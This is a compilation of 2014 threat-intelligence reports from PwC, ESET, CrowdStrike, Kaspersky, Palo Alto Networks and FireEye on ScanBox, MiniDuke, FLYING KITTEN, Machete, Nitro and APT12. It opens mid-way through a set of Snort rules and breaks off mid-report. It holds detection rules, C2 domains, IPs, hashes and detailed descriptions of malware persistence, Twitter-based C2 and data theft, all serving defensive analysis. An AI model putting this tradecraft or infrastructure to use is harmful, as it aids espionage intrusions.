; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup ScanBox Watering Hole Content ( document.getElementsByTagName ( 'head ' ) .item ( 0 ) .appendChild ( form_tag ) \ ; ) '' ; flow : established , from_server ; file_data ; content : '' document.getElementsByTagName ( 'head ' ) .item ( 0 ) .appendChild ( form_tag ) \ ; '' ; classtype : trojan-activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup ScanBox Watering Hole Content ( return ( ( ! a ) ? ' x- ' : a ) + Math.floor ( Math.random ( ) * 99999 ) \ ; ) '' ; flow : established , from_server ; file_data ; content : '' return ( ( ! a ) ? ' x- ' : a ) + Math.floor ( Math.random ( ) * 99999 ) \ ; '' ; classtype : trojan-activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) alert tcp $ EXTERNAL_NET any > $ HOME_NET any ( msg : '' -- [ PwC CTD ] MultiGroup TH3BUG and Non-Targetted Groups Watering Hole Code ( Chr ( CInt ( ns ( i ) ) Xor n ) ) '' ; flow : established , from_server ; file_data ; content : '' Chr ( CInt ( ns ( i ) ) Xor n ) '' ; classtype : trojan-activity ; reference : url , pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos affected-and-whos-using-it-1.html ; metadata : tlp WHITE , author CDD ; sid : xxxxxx ; rev:2015021901 ; ) .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
6 .
Appendices .
Appendix A – ScanBox Sites .
Where the site was referenced via phishing as opposed to ‘ Watering Hole ’ based activity , it has been excluded from the following table .
Where we have an assigned cluster , but have not discussed it in this document , we have given ‘ Cluster [ Letter ] ’ these are not intended as names for groups .
Where we do not have an associated group we have listed ‘ unknown ’ under this field .
Country Sector/Target Cluster CN Uyghur Cluster 1 US Think Tank Cluster 2 US Think Tank Cluster 2 US Think Tank Cluster 2 KR Hospitality Cluster 3 JP Industrial Sector Cluster 4 GB Chemicals Cluster 4 JP Geological Surveying Cluster 4 VN Government Cluster A JP Education Cluster A JP Geological Surveying Cluster A MN Government Cluster B MM Government Cluster C MN Media Unknown MN Media Unknown CN NGO Unknown VN Government Unknown AU Government Unknown CN Technology Unknown .
Cyber Threat Operations < /footer .
Tactical Intelligence Bulletin – TLP : WHITE .
Appendix B – Indicators of Compromise – TLP : WHITE .
This table only includes related new single value IoCs which were not already published in our previous blog , which we are happy to share at TLP : WHITE .
Cluster Value Artefact type Cluster 1 1.9.5.38 IP Address Cluster 1 103.255.61.227 IP Address Cluster 1 118.193.153.221 IP Address Cluster 1 118.193.153.227 IP Address Cluster 1 174.121.122.73 IP Address Cluster 1 4639c30b3666cb11b3927d5579790a88bff68e8137f18241f4693e0d4539c608 Malware Hash Cluster 1 809959f390d5a49c8999ad6fff27fdc92ff1b2b0 Malware Hash Cluster 1 ab58b6aa7dcc25d8f6e4b70a24e0ccede0d5f6129df02a9e61293c1d7d7640a2 Malware Hash Cluster 1 e8a8ffe39040fe36e95217b4e4f1316177d675ed Malware Hash Cluster 1 file.googlecaches.com Hostname Cluster 1 gtm.googlecaches.com Hostname Cluster 1 js.googlewebcache.com Hostname Cluster 1 owa.outlookssl.com Hostname Cluster 4 122.10.10.161 IP Address Cluster 4 204.152.199.43 IP Address Cluster 4 50.2.24.211 IP Address Cluster 4 bak.mailaunch.com Hostname Cluster 4 f1890cc9d6dc84021426834063394539414f68d8 Malware Hash Cluster 4 us-mg6.mail.yahoo.mailaunch.com Hostname .
Appendix C – Standard software list detected by ScanBox .
7z AhnLab_V3 antiyfx a-squared avg2012 avira Bit9 bitdefender_2013 BkavHome COMODO Dr.Web emet4.1 emet5.0 eScan eset_nod32 ESET-SMART ESTsoft .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Fortinet F-PROT F-Secure f-secure2011 IKARUS Immunet iTunes JiangMin Kaspersky_2012 Kaspersky_2013 Kaspersky_Endpoint_Security_8 mcafee_enterprise Mse Norman Norton Nprotect Outpost PC_Tools QuickHeal Rising Rising_firewall sophos SQLServer Sunbelt SUPERAntiSpyware Symantec_Endpoint12 symantec-endpoint Trend2013 ViRobot4 VirusBuster vmware-client vmware-server WinRAR winzip .
Cyber Threat Operations .
Tactical Intelligence Bulletin – TLP : WHITE .
Further information .
For more in-depth coverage , including full details of the analysis behind this blog as well as additional indicators which can be used to detect similar samples , or if you have any other queries , please give us a shout at threatintelligence @ uk.pwc.comuk.pwc.comin-depth coverage , including full details of the analysis behind this blog as well as additional indicators which can be used to detect similar samples , or if you have any other queries , please give us a shout at threatintelligence @ uk.pwc.com .
The information contained in this document has been prepared as a matter of interest and for information purposes only , and does not constitute professional advice .
You should not act upon the information contained in this email without obtaining specific professional advice .
No representation or warranty ( express or implied ) is given as to the accuracy or completeness of the information contained in this email , and , to the extent permitted by law , PricewaterhouseCoopers LLP , its members , employees and agents do not accept or assume any liability , responsibility or duty of care for any consequences of you or anyone else acting , or refraining to act , in reliance on the information contained in this email or for any decision based on it .
Cyber Threat Operations .
Miniduke still duking it out .
At the end of April Microsoft announced that a vulnerability in Word was actively being exploited .
This vulnerability occurred in parsing RTF files and was assigned CVE-2014-1761 , a thorough analysis of which can be found on the HP Security Research blog .
We have since seen multiple cases where this exploit is used to deliver malware and one was particularly interesting as it contained a new variant of MiniDuke ( also known as Win32/SandyEva ) .
MiniDuke was first discussed by Kaspersky in March 2013 in their paper The MiniDuke Mystery : PDF 0 day Government Spy Assembler 0x29A Micro Backdoorand shortly after in a paper by Bitdefender .
Some of the characteristics of MiniDuke — such as its small size ( 20 KB ) , its crafty use of assembly programming , and the use of zero-day exploits for distribution — made it an intriguing threat .
Although the backdoor is still quite similar to its previous versions , some important changes were made since last year , the most notable being the introduction of a secondary component written in JScript to contact a C & C server via Twitter .
The RTF exploit document .
The exploit document was named Proposal-Cover-Sheet-English.rtf and is quite bland when compared to the documents that were used in 2013 , which were of a political nature .
We received the document on April 8th , only three days after the compilation of the MiniDuke payload , dated April 5th in the PE header .
The payload remains quite small at only 24 KB .
The functionality of the shellcode which is executed by triggering the vulnerability is rather simple and straightforward .
After decrypting itself and obtaining the addresses of some functions exported by kernel32.dll , it decrypts and drops the payload in the % TEMP % directory in a file named “ a.l ” which is subsequently loaded by calling kernel32 ! LoadLibraryA .
An interesting thing about the shellcode is that before transferring control to any API function it checks the first bytes of the function in order to detect hooks and debugger breakpoints which may be set by security software and monitoring tools .
If any of these are found the shellcode skips the first 5 bytes of the function being called by manually executing prologue instructions ( mov edi , edi ; push ebp ; mov ebp , esp ) and then jumping to the function code as illustrated below .
The next graph presents the execution flow of this malware when the exploitation is successful .
As mentioned previously this version of the MiniDuke payload comes with two modules which we refer to as the main module and the TwitterJS module .
Execution flow of MiniDuke .
Main Component .
Installation .
Once MiniDuke receives control it checks that the host process is not rundll32.exe and whether the current directory is % TEMP % .
If either of those conditions is met the malware assumes it is run for the first time and it proceeds with its installation onto the system .
MiniDuke gathers information about the system and encrypts its configuration based on that information , a method also used by OSX/Flashback ( this process is called watermarking by Bitdefender ) .
The end result is that it is impossible to retrieve the configuration of an encrypted payload if analyzing it on a different computer .
The information collected on infection has not changed since the previous version and consists of the following values :
volume serial number ( obtained from kernel32 ! GetVolumeInformationA ) CPU information ( obtained with the cpuidinstruction ) computer name ( obtained from kernel32 ! GetComputerNameA ) .
Once the encrypted version of the malware is created , it is written into a file in the % ALLUSERSPROFILE % \Application Data directory .
The name of the file is randomly picked from the following values ( you can find this listing and those of the next screenshots on the VirusRadar description :
The filename extension is also picked randomly from the following list :
To persist on the infected system after reboots , the malware creates a hidden .LNK file in the “ Startup ” directory pointing to the modified main module .
The name of the .LNK file is randomly drawn from the following values :
The .LNKfile is created using a COM object with the IShellLinkA interface and contains the following command : “ C : \Windows\system32\rundll32.exe % path_to_main_module % , export_function ” Which gives something like : “ C : \Windows\system32\rundll32.exe C : \DOCUME~1\ALLUSE~1\APPLIC~1\data.cat , IlqUenn “ .
Operation .
When the malware is loaded by rundll32.exe and the current directory isn ’ t % TEMP % , the malware starts with gathering the same system information as described in the “ Installation ” section to decrypt configuration information .
As with the previous version of MiniDuke , it checks for the presence of the following processes in the system :
If any of these are found in the system the configuration information will be decrypted incorrectly , i.e .
the malware will run on the system without any communication to C & C servers .
If the configuration data is decrypted correctly , MiniDuke retrieves the Twitter page of @ FloydLSchwartz in search of URLs by which to reach C & C server .
It looks for the tag “ X ) ) ) ” on the page ( MiniDuke was searching for “ uri ! ” in previous samples ) and if the tag is found it decrypts a URL from the data that follows it .
The Twitter account @ FloydLSchwartz does exist but has only retweets and no strings with the special tag .
As the next step , MiniDuke gathers the following information from the infected systems :
computer name and user domain name country code of the infected host IP address obtained from http : //www.geoiptool.com OS version information domain controller name , user name , groups a user account belongs to a list of AV products installed onto the system Internet proxy configuration version of MiniDuke .
This information is then sent to the C & C server along with the request to download a payload .
The final URL used to communicate with the C & C server looks like this : < url_start > /create.php ? < rnd_param > = < system_info > Those tokens are derived as follows :
url_start – the URL retrieved from the twitter account rnd_param – randomly generated of lower case alphabet characters parameter name in the query string of the URL system_info – base64 encoded and encrypted system information .
An example of such a URL is given below :
The payload is downloaded in the file named “ fdbywu ” using the urlmon ! URLDownloadToFileA API :
The downloaded payload is a fake GIF8 file containing encrypted executable .
The malware processes the downloaded file in the same way as previous samples of MiniDuke : it verifies the integrity of the file using RSA-2048 , then decrypts it , stores in a file and finally executes it .
The RSA-2048 public key to verify integrity of the executable inside the GIF file is the same as in the previous version of MiniDuke .
Twitter Generation Algorithm .
In the event that MiniDuke is unable to retrieve a C & C URL from this account , it generates a username to search for based on the current date .
The search query changes roughly every seven days and is similar to the backup mechanism in previous versions that was using Google searches .
A Python implementation of the algorithm can be found in Appendix B .
TwitterJS component .
The TwitterJS module is extracted by creating a copy of the Windows DLL cryptdll.dll , injecting a block of code into it and redirecting the exported functions to this code .
Here is how the export address table of the patched binary looks after modifications .
This file is then stored in an Alternate Data Stream ( ADS ) in NTUSER.DAT in the % USERPROFILE % folder .
Finally this DLL is registered as the Open command when a drive is open , which has the effect of starting the bot every time the user opens a disk drive .
Below you can find the content of the init.cmd script used by MiniDuke to install TwitterJS module onto the system .
When loaded , TwitterJS instantiates the JScript COM object and decrypts a JScript file containing the core logic of the module .
Prior to executing it , MiniDuke applies a light encoding to the script : The next images show the result of two separate obfuscations , we can see that the variables have different values .
This is probably done to thwart security systems that scan at the entry points of the JScript engine .
Result of first obfuscation .
Result of second obfuscation .
The purpose of this script is to use Twitter to find a C & C and retrieve JScript code to execute .
It first generates a Twitter user to search for ; this search term changes every 7 days and is actually a match to the real account name , not the Twitter account name .
The bot then visits the Twitter profiles returned by the search and looks for links that end with “ .xhtml “ .
When one is found , it replaces “ .xhtml ” with “ .php ” and fetches that link .
Information about the computer is embedded in the Accept HTTP header .
The first link on the retrieved page should contain base64 data ; the name attribute of the link is used as a rolling XOR key to decrypt the JScript code .
Finally , MiniDuke calculates a hash of the fetched script and compares it with a hardcoded hash in the TwitterJS script .
If they match , the fetched script is executed by calling eval ( ) .
The tale of the broken SHA-1 .
The code hashing algorithm used by the component looks very much like SHA-1 but outputs different hashes ( you can find the complete implementation in Appendix B .
We decided to search for what was changed in the algorithm ; one of our working hypotheses was that the algorithm might have been altered to make collisions feasible .
We couldn ’ t find an obvious difference ; all the constants and the steps of the algorithm were as expected .
Then we noticed that for short messages only the second 32-bit word was different when compared to the original SHA-1 .
SHA1 ( ‘ test ’ ) : a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 TwitterJS_SHA1 ( ‘ test ’ ) : a94a8fe5dce4f01c1c4c0873d391e987982fbbd3 .
By examining how this 2nd word was generated we finally discovered that this was caused by a scope issue .
As shown below the SHA-1 function used a variable named f : the function Z ( ) is then called which also uses a variable named f without the var keyword , causing it to be treated as a global variable rather than local to the function .
The end result is that the value of f is also changed in the SHA-1 function which affects the value of the 2nd word for that round and ultimately the whole hash for long messages .
A likely explanation of how this problem came to be is that the variable names were changed to single letters using an automated tool prior to embedding it in the payload .
The 2 f variables probably had different names in the original script which avoided the issue .
So this leaves us with two takeaways : 1 ) The difference in the hashing algorithm was unintentional and 2 ) Always declare your local variables with the var keyword .
; - ) .
Twitter DGA accounts .
We generated the list of Twitter search terms for 2013-2014 and checked if any of those were registered .
At the moment only one exists , @ AA2ADcAOAA , which is the TwitterJS account that was generated between August 21st and 27th 2013 .
This account has no tweets .
In an effort to discover potential victims , we registered the Twitter accounts corresponding to the current week both for the main and TwitterJS components and set up tweets with encrypted URLs so that an infected computer would reach out to our server .
So far we have received connections via the TwitterJS accounts from four computers located in Belgium , France and the UK .
We have contacted national CERTs to notify the affected parties .
We detect the RTF exploit document as Win32/Exploit . CVE-2014-1761 .D and the MiniDuke components as Win32/SandyEva.G .
Appendix A : SHA-1 hashes .
SHA-1 Description 58be4918df7fbf1e12de1a31d4f622e570a81b93 RTF with Word exploit CVE-2014-1761 b27f6174173e71dc154413a525baddf3d6dea1fd MiniDuke main component ( before config encryption ) c059303cd420dc892421ba4465f09b892de93c77 TwitterJS javascript code .
Appendix B & C : DGA algorithms , Twitter DGA accounts .
The DGA scripts and account lists have been moved to our Github account : https : //github.com/eset/malware-research/tree/master/miniduke Author ESET Research , ESET .
Cat Scratch Fever : CrowdStrike Tracks Newly Reported Iranian Actor as FLYING KITTEN .
Today , our friends at FireEye released a report on an Iran-based adversary they are calling Saffron Rose .
CrowdStrike Intelligence has also been tracking and reporting internally on this threat group since mid January 2014 under the name FLYINGKITTEN , and since that time has seen targeting of multiple U.S . based defense contractors as well as political dissidents .
Flying Kitten Targeted Intrusion .
FireEye ’ s report notes that this adversary ’ s targeted intrusion activity consists of credential theft and malware delivery individually .
The FLYING KITTEN campaigns investigated by CrowdStrike Intelligence showed that the actor actually combines the two .
For example , the adversary will register a domain that spoofs the name of the targeted organization and then host a spoofed login page on that site .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a “ Browser Patch ” or other similar type of file .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
In addition to the aerospace/defense and dissident targeting , it also appears that FLYING KITTEN is also engaged in broader targeting via the website parmanpower.com .
This website is registered via the same registrant email ( info@usa.gov.us ) and other Whois information as some of the other domains related to the activity discussed above .
It purports to be the website of a business engaged in recruiting , training , and development in Erbil , Iraq .
No malicious activity has been linked to this domain , however , the fact that it was registered under the same registrant email at the same time as other FLYING KITTEN domains linked to malicious activity , it is likely that the adversary is using this site for malicious purposes as well .
The website does not appear to deliver any malware , so its most likely purpose is to act as a credential-collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014.org ) the adversary used earlier this year .
This spoofed recruiting company website could be used to target entities across a wide range of sectors .
Attribution .
Attribution in this case is interesting , as the adversary appears to have made a mistake when registering its malicious domains .
The registrant email that currently appears in the Whois records of some of the FLYING KITTEN domains is info@usa.gov.us , however historical records show that the domains were originally registered under the email address keyvan.ajaxtm@gmail.com .
As FireEye ’ s report notes , the keyvan.ajaxtm@gmail.com email address ties back to an Iran-based entity called Ajax Security Team .
Earlier this year , Ajax Security had an easily identifiable presence on the Internet with its own website and related Facebook pages .
This Internet presence has decreased significantly since early 2014 , likely due to a desire to keep a lower profile now that the group is engaged in targeted intrusion activity .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool :
rule CrowdStrike_FlyingKitten : rat { meta : copyright = `` CrowdStrike , Inc '' description = `` Flying Kitten RAT '' version = `` 1.0 '' actor = `` FLYING KITTEN '' in_the_wild = true strings : $ classpath = `` Stealer.Properties.Resources.resources '' $ pdbstr = `` \Stealer\obj\x86\Release\Stealer.pdb '' condition : all of them and uint16 ( 0 ) == 0x5A4D and uint32 ( uint32 ( 0x3c ) ) == 0x4550 and uint16 ( uint32 ( 0x3C ) + 0x16 ) & 0x2000 == 0 and ( ( uint16 ( uint32 ( 0x3c ) +24 ) == 0x010b and uint32 ( uint32 ( 0x3c ) +232 ) > 0 ) or ( uint16 ( uint32 ( 0x3c ) +24 ) == 0x020b and uint32 ( uint32 ( 0x3c ) +248 ) > 0 ) ) } rule CrowdStrike_CSIT_14003_03 : installer { meta : copyright = `` CrowdStrike , Inc '' description = `` Flying Kitten Installer '' version = `` 1.0 '' actor = `` FLYING KITTEN '' in_the_wild = true strings : $ exename = `` IntelRapidStart.exe '' $ confname = `` IntelRapidStart.exe.config '' $ cabhdr = { 4d 53 43 46 00 00 00 00 } condition : all of them } .
You can use this rule with CrowdStrike ’ s free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
If you have any questions about these signatures or want to hear more about Flying Kitten and their tradecraft , please contact : intelligence @ crowdstrike.com and inquire about Falcon Intelligence , our Cyber Threat Intelligence subscription .
Share this .
`` El Machete '' .
Introduction .
Some time ago , a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown , undetected malware .
While assisting the customer , we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces .
At first look , it pretends to be a Java related application but after a quick analysis , it was obvious this was something more than just a simple Java file .
It was a targeted attack we are calling `` Machete '' .
What is `` Machete '' ?
`` Machete '' is a targeted attack campaign with Spanish speaking roots .
We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 .
The operation may be still `` active '' .
The malware is capable of the following cyber-espionage operations :
Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine .
Targets of `` Machete '' .
Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
In some cases , such as Russia , the target appears to be an embassy from one of the countries of this list .
Targets include high-level profiles , including intelligence services , military , embassies and government institutions .
How does `` Machete '' operate ?
The malware is distributed via social engineering techniques , which includes spear-phishing emails and infections via Web by a fake Blog website .
We have found no evidence of of exploits targeting zero-day vulnerabilities .
Both the attackers and the victims appear to be Spanish-speaking .
During this investigation , we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign .
These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .
These are the names of the PowerPoint attachments :
Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar .
These files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back to 2008 .
A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .
The result is extremely large files , over 3MB .
Here are some screnshots of the mentioned files :
A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .
This is very unusual and does not have any advantage for the attackers except ease of coding .
There is no multi-platform support as the code is heavily Windows-oriented ( use of libraries ) .
However , we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well .
In addition to Windows components , we also found a mobile ( Android ) component .
Both attackers and victims speak Spanish natively , as we see it consistently in the source code of the client side and in the Python code .
Indicators of Compromise .
Web infections .
The following code snippets were found into the HTML of websites used to infect victims :
Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit .
Also the following link to one known infection artifact : http://name.domain.org/nickname/set/Signed_Update.jar .
Domains .
The following are domains found during the infection campaign .
Any communication with them must be considered extremely suspicious .
java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) .
Infection artifacts .
MD5 Filename 61d33dc5b257a18eb6514e473c1495fe AwgXuBV31pGV.eXe b5ada760476ba9a815ca56f12a11d557 EL ARTE DE LA GUERRA.exe d6c112d951cb48cab37e5d7ebed2420b Hermosa XXX.rar df2889df7ac209e7b696733aa6b52af5 Hermosa XXX.pps.rar e486eddffd13bed33e68d6d8d4052270 Hermosa XXX.pps.rar e9b2499b92279669a09fef798af7f45b Suntzu.rar f7e23b876fc887052ac8e2558f0d6c38 Hot Brazilian XXX.rar b26d1aec219ce45b2e80769368310471 Signed_Update.jar .
Traces on infected machines .
Creates the file Java Update.lnk pointing to appdata/Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up .
Human part of `` Machete '' .
Language .
The first evidence is the language used , both for the victims and attackers , is Spanish .
The victims are all Spanish speaking according to the filenames of the stolen documents .
The language is also Spanish for the operators of the campaign , we can find all the server side code written in this language : reportes , ingresar , peso , etc .
Conclusion .
The `` Machete '' discovery shows there are many regional players in the world of targeted attacks .
Unfortunately , such attacks became a part of the cyber arsenal of many nations located over the world .
We can be sure there are other parallel targeted attacks running now in Latin America and other regions .
Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan Spy.Python.Ragua .
Note : A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers .
Contact : intelreports @ kaspersky.com .
New Indicators of Compromise for APT Group Nitro Uncovered .
In mid-July of this year , we noticed yet another legitimate website had been compromised by APT actors and was serving malware .
In this case , it was a group commonly referred to as “ Nitro , ” which was coined by Symantec in its 2011 whitepaper .
As we dug deeper , we found additional compromised legitimate websites and malware from the same group back through March of this year .
In most instances , the malware is one commonly referred to as “ Spindest , ” though we also found “ PCClient ” and “ Farfli ” variants in use by the group .
We don ’ t have enough data to say for certain that all of the malware in this blog was delivered via compromised legitimate websites .
Historically , Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware , which was not seen in these attacks .
Since at least 2013 , Nitro appears to have somewhat modified their malware and delivery methods to include Spindest and legitimate compromised websites , as reported by Cyber Squared ’ s TCIRT .
Our findings indicate they are continuing to evolve with the addition of PCClient and Farfli variants .
The Maltego screenshot below shows the activity we describe in this blog .
These events impacted at least the following industries , across four waves : A US based IT Solutions provider ; The European office of a major , US based commercial vendor of space imagery and geospatial content ; A European leader in power technologies and automation for utilities and industry ; A US based provider of medical and dental imaging systems and IT solutions .
In July , Nitro compromised a South Korean clothing and accessories manufacturer ’ s website to serve malware commonly referred to as “ Spindest . ” Of all the samples we ’ ve tied to this activity so far noted in this blog , this is the only one configured to connect directly to an IP address for Command and Control ( C2 ) .
This IP address has been in use by this group for some time , which is interesting since they have evolved other components of their kill chain over time to ensure malware delivery , but oddly not altered their C2 infrastructure .
It is simple for companies to block any outbound traffic to this IP , which would negate the effort Nitro put into successfully delivering the malware .
37 AV vendors within VirusTotal properly identify it , and the PE timestamp shows the day before we saw it .
In addition , the following three samples were found roughly a week apart from each other , possibly indicating the timing of the waves of activity .
Table 1 .
SHA256 0a1103bc90725d4665b932f88e81d39eafa5823b0de3ab146e2d4548b7da79a0 MD5 7915aabb2e66ff14841e4ef0fbff7486 File Name update.exe File Size 106496 First Seen 2014-07-24 11:54:02 C2 IP 223.25.233.248 .
The next sample we found is commonly known as PCClient , which is not malware previously tied to this group .
We discovered this , and many of the following samples , through historic IP resolution overlap between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12 .
The second IP has also not been reported as tied to this group before .
However , this shifting of IP resolutions back and forth indicates Nitro is in control of these domains .
It also makes is fairly easy for any Infosec team to reach the same conclusion we did , which again negates their use both of a previously unreported domain and IP for C2 , as well as a new family of malware .
25 AV vendors within VirusTotal properly classify this sample as malware .
Its PE timestamp was 8 July , almost a week prior when we first saw it .
Table 2 .
SHA256 8aef92a986568ba31729269efa31a2488f35920d136ab41cb6fce55fd8e0b4b7 MD5 7522baef20df95eeeeafdf4efe3aac3c File Name lsm.exe File Size 65536 First Seen 2014-07-15 11:48:33 C2 URL xenserver.ddns.net Resolution 196.45.144.12 .
The next sample was another Spindest variant and had the same timestamp as the aforementioned PcClient sample .
In addition , Nitro chose to use the same C2 for this sample , making it easy to both find and tie to the group .
41 AV vendors within VirusTotal properly classify this sample as malware .
Table 3 .
SHA256 995bc16a5c2c212b57ba00c2376ac57c8032c7f2b1d521f995a5e1d49066d64d MD5 6527ba8baab0f86b0ffb6178247772c4 File Name install_reader11_en_aaa_aih.exe File Type PE File Size 81920 First Seen 2014-07-09 16:31:26 C2 URL xenserver.ddns.net Resolution 196.45.144.12 .
The next wave of activity we found took place in mid-May .
Both samples were Spindest variants with the same PE timestamp of 15 May .
While neither MD5s for C2 match , the aforementioned link to a post by Cyber Squared ’ s TCIRT did document Nitro using Spindest variants with the same file name starting late December last year .
In that case they used the historic C2 IP we note in Table 1 in this blog .
34 AV vendors within VirusTotal properly classify the first sample as malware , and 40 AV Vendors the second sample .
Table 4 .
SHA256 e7f2af8c48f837da57000c068368d77bc9b06eba1e077edfab58df6aa2ea40ec MD5 271e6a4d45c2817f86148ca413f97604 File Name mdm.exe File Size 118784 First Seen 2014-05-20 08:43:15 C2 URL zipoo.redirectme.net Resolution 196.45.144.12 .
Table 5 .
SHA256 e601da16f923b33465dbafbff9d47195e8fc50099fd0581a16a1745bf890afb6 MD5 be765cd5723e4366d35172aaf13fad44 File Name CitrixReceiverWeb.exe File Size 135168 First Seen 2014-05-15 16:34:10 C2 URL zipoo.redirectme.net Resolution 196.45.144.12 .
The malware dropped was configured to use good.myftp.org as the C2 URL , and the IP resolution was 223.25.233.248 .
Both of these are known Nitro Indicators of Compromise ( IOCs ) .
In this case , the malware was a Farfli variant , again not a malware previously tied to this group .
39 AV vendors within VirusTotal properly identify the file as malware .
The PE timestamp on the file was 1 April , about two weeks before we saw the file .
Continuing the activity , we discovered the actors had compromised a legitimate website belonging to an international technology company that provides Software Configuration and Change Management ( SCCM ) solutions in mid-May .
( It is a well regarded company and partners with large companies such as Microsoft . ) Table 6 .
SHA256 184c083e839451c2ab0de7a89aa801dc0458e2bd1fe79e60f35c26d92a0dbf6a MD5 ec519d709c0582346741fe0094208216 File Name update.exe File Size 159744 First Seen 2014-04-15 01:13:14 C2 URL good.myftp.org Resolution 223.25.233.248 .
The final sample , from mid-March , was also hosted on a compromised legitimate website , this time a small , US based IT company .
The IP resolved by the C2 URL was changed two days after we saw this file to overlap with good.myftp.org for a month before returning the below resolution .
The filename matches that of the sample in Table 5 , which had a very similar third level C2 domain and the same IP resolution .
This is also a Spindest variant with a PE timestamp of the same day we saw it .
39 AV vendors within VirusTotal properly identify the file as malware .
Table 7 .
SHA256 ffbddfb536e8e604c880ec977d06f804a500fc0396899bd2c195fb1f5b74207a MD5 a3b2e34973691ad320b70248bd67fbd2 File Name CitrixReceiverWeb.exe File Size 192512 First Seen 2014-03-12 06:58:22 C2 URL zip.redirectme.net Resolution 196.45.144.12 .
As this post and previous cited research show , APT groups such as Nitro will continue to evolve their techniques within the kill chain to avoid detection .
However , they also demonstrate the value of tracking these threats over time , as this allowed us to uncover and properly attribute the new IOCs because Nitro was still re-using old C2 infrastructure with their new malware .
For Palo Alto Networks customers , all of these files were properly identified by WildFire as malware and all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems .
Darwin ’ s Favorite APT Group .
Introduction .
The attackers referred to as APT12 ( also known as IXESHE , DynCalc , and DNSCALC ) recently started a new campaign targeting organizations in Japan and Taiwan .
APT12 is believed to be a cyber espionage group thought to have links to the Chinese People ’ s Liberation Army .
APT12′s targets are consistent with larger People ’ s Republic of China ( PRC ) goals .
Intrusions and campaigns conducted by this group are in line with PRC goals and self-interest in Taiwan .
Additionally , the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure , as APT12 used the same strategy after compromising the New York Times in Oct 2012 .
Much like Darwin ’ s theory of biological evolution , APT12 been forced to evolve and adapt in order to maintain its mission .
The new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog “ Illuminating The Etumbot APT Backdoor . ” FireEye refers to the Etumbot backdoor as RIPTIDE .
Since the release of the Arbor blog post , FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE .
This is the second time FireEye has discovered APT12 retooling after a public disclosure .
As such , FireEye believes this to be a common theme for this APT group , as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations .
FireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT .
Both backdoors were dropped from malicious documents built utilizing the “ Tran Duy Linh ” exploit kit , which exploited CVE-2012-0158 .
These documents were also emailed to organizations in Japan and Taiwan .
While APT12 has previously used THREEBYTE , it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE .
Similarly , WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified .
However , the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12 .
Background .
From October 2012 to May 2014 , FireEye observed APT12 utilizing RIPTIDE , a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control ( C2 ) server .
RIPTIDE ’ s first communication with its C2 server fetches an encryption key , and the RC4 encryption key is used to encrypt all further communication .
Figure 1 : RIPTIDE HTTP GET Request Example .
In June 2014 , Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth .
The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014 .
Following the release of the article , FireEye observed a distinct change in RIPTIDE ’ s protocols and strings .
We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors .
The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules .
FireEye dubbed this new malware family HIGHTIDE .
HIGHTIDE Malware Family .
On Sunday August 24 , 2014 we observed a spear phish email sent to a Taiwanese government ministry .
